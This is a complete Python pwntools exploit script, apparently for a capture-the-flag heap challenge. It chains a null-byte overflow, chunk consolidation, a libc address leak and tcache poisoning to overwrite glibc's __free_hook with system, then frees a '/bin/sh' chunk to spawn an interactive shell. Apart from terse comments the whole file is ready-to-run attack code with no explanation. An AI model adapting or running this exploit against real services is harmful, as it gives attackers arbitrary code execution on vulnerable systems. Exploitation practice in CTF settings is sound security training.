from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        host = args.HOST or 'localhost'
        port = int(args.PORT or '1337')
        return remote(host, port)

def main():
    r = conn()
    def debug():
        if args.LOCAL:
            gdb.attach(r)
            pause()

    # good luck pwning :)

    def alloc(size, data):
        r.sendlineafter(b'> ', b'1')
        r.sendlineafter(b'size? ', str(size).encode())
        r.sendafter(b'str? ', data)
        r.recvuntil(b'stored at ')
        return int(r.recvuntil(b'!', drop=True))

    def split(idx, delim):
        r.sendlineafter(b'> ', b'2')
        r.sendlineafter(b'idx? ', str(idx).encode())
        r.sendlineafter(b'delim? ', delim)

    def free(idx):
        r.sendlineafter(b'> ', b'3')
        r.sendlineafter(b'idx? ', str(idx).encode())

    # to fill 0x120 tcache later
    for _ in range(7):
        alloc(0x118, b'A')

    # allocate stuff
    evil = alloc(0x18, b'A'*0x18)
    victim = alloc(0x118, flat(
        b'\x00'*0xf0, 0x100,
    ))
    back = alloc(0x118, b'\n')
    alloc(0x18, b'\n')

    # fill 0x120 tcache
    for i in range(7):
        free(i)

    # to fill 0x90 tcache later
    for _ in range(7):
        alloc(0x88, b'A')

    # free middle chunk
    free(victim)

    # null byte overflow
    split(evil, b'\x21')

    # split victim (comes from victim)
    top_half = alloc(0x88, flat(
        b'E'*0x80, 0x90,
    ))

    # tcache poison later (comes from victim)
    victim2 = alloc(0x48, b'\n')

    # fill 0x90 tcache
    for i in range(7):
        free(i)

    # write a prev_size
    free(top_half)

    # consolidate
    free(back)

    # libc leak
    split(victim2, b'\xff')
    libc.address = unpack(r.recv(6), 'all') - 0x3ebd0a
    log.info(hex(libc.address))

    # tcache poison
    free(victim2)
    alloc(0x238, flat(
        b'\x00'*0x88, 0x50,
        libc.sym['__free_hook'] - 8,
    ))

    # write to __free_hook
    alloc(0x48, b'\n')
    shell = alloc(0x48, flat(
        b'/bin/sh\x00',
        libc.sym['system'],
    ))

    # shell
    free(shell)
    r.clean()
    r.interactive()

if __name__ == '__main__':
    main()
